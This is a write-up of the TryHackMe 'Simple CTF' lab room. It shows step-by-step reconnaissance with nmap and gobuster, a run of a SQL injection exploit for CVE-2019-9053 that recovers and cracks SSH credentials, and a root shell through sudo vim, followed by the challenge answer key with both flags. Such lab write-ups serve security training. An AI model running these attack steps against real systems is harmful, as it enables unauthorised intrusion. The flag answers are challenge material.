# Simple CTF - TryHackMe Writeup

This is a writeup for the "Simple CTF" room on TryHackMe, [here](https://tryhackme.com/room/easyctf), enjoy!!!
---

## Steps

### 1. Identify Services Running Under Port 1000
- Used `nmap` to scan for open ports and services:
  ```bash
  nmap -sV -p- [VICTIM IP]
  ```
- Example:
  ```bash
  nmap -sV -p- 10.10.22.23
  ```
- Results:
  ```
  PORT     STATE SERVICE VERSION
  21/tcp   open  ftp     vsftpd 3.0.3
  80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
  2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
  ```
- Ports under 1000: 21 (FTP) and 80 (HTTP).
- Answer: `2`

### 2. Identify the Service on the Higher Port
- From the `nmap` scan, the highest port is `2222`, running `SSH`.
- Answer: `ssh`

### 3. Explore the Web Server
- Browsed to `http://[VICTIM IP]` and found the default Apache2 page.
- Used `gobuster` to enumerate directories:
  ```bash
  gobuster dir -u http://[VICTIM IP] -w [PATH TO WORDLIST] -t 100
  ```
- Example:
  ```bash
  gobuster dir -u http://10.10.22.23 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
  ```
- Note: `-t 100` sets the number of concurrent threads to 100, speeding up the scan.
- Found a directory: `/simple`.
- Browsed to `http://[VICTIM IP]/simple` and identified "CMS Made Simple" version 2.2.8.

### 4. Identify and Exploit the Vulnerability
- Searched Google for "CMS Made Simple 2.2.8 exploit" and found a SQL injection exploit (CVE-2019-9053) on Exploit-DB.
- Used a fixed version of the exploit by me from [this GitHub repo](https://github.com/so1icitx/CVE-2019-9053).
- Saved the Python script as `exploit.py` on my attack box.
- Installed required dependency (check github repo for more instructions!): 
  ```bash
  pip install termcolor
  ```
- Ran the exploit to extract credentials:
  ```bash
  python exploit.py -u http://[VICTIM IP]/simple -crack -w [PATH TO WORDLIST]
  ```
- Example:
  ```bash
  python exploit.py -u http://10.10.22.23/simple -crack -w /usr/share/wordlists/rockyou.txt
  ```
- Results:
  ```
  [+] Username found: mitch
  [+] Email found: admin@admin.com
  [+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
  [+] Password cracked: secret
  ```
- CVE: `CVE-2019-9053`
- Vulnerability type: `sqli` (SQL Injection)
- Password: `secret`

### 5. Login to the Machine
- Used SSH to connect with the obtained credentials:
  ```bash
  ssh mitch@[VICTIM IP] -p 2222  # using 2222 port not 22 casue from nmap scan we established that ssh is running on port 2222
  ```
- Example:
  ```bash
  ssh mitch@10.10.22.23 -p 2222
  ```
- Entered password `secret` and logged in successfully.
- Login service: `ssh`

### 6. Obtain the User Flag
- Checked the current directory:
  ```bash
  pwd
  ```
- Output: `/home/mitch`
- Listed files and read the user flag:
  ```bash
  ls
  cat user.txt
  ```
- User flag: `G00d j0b, keep up!`

### 7. Identify Other Users
- Navigated to the parent directory to check for other users:
  ```bash
  cd ..
  ls
  ```
- Output: `mitch  sunbath`
- Other user: `sunbath`
- Attempted to access `/home/sunbath` but lacked permissions.

### 8. Privilege Escalation
- Checked sudo privileges:
  ```bash
  sudo -l
  ```
- Output:
  ```
  User mitch may run the following commands on Machine:
      (root) NOPASSWD: /usr/bin/vim
  ```
- Leveraged `vim` for privilege escalation (per GTFOBins):
  ```bash
  sudo vim -c ':!/bin/sh'
  ```
- Dropped into a root shell:
  ```bash
  id
  ```
- Output: `uid=0(root) gid=0(root) groups=0(root)`
- Tool used: `vim`

### 9. Obtain the Root Flag
- Navigated to the root directory and read the flag:
  ```bash
  cd /root
  ls
  cat root.txt
  ```
- Root flag: `W3ll d0n3. You made it!`

---

## Answers to Challenge Questions
1. **How many services are running under port 1000?**: `2`
2. **What is running on the higher port?**: `ssh`
3. **What’s the CVE you’re using against the application?**: `CVE-2019-9053`
4. **To what kind of vulnerability is the application vulnerable?**: `sqli`
5. **What’s the password?**: `secret`
6. **Where can you login with the details obtained?**: `ssh`
7. **What’s the user flag?**: `G00d j0b, keep up!`
8. **Is there any other user in the home directory? What’s its name?**: `sunbath`
9. **What can you leverage to spawn a privileged shell?**: `vim`
10. **What’s the root flag?**: `W3ll d0n3. You made it!`

---

## Tools Used
- `nmap`: Port scanning and service enumeration.
- `gobuster`: Directory enumeration.
- `python exploit.py`: SQL injection exploit for CVE-2019-9053.
- `ssh`: Remote access to the target.
- `vim`: Privilege escalation.

---
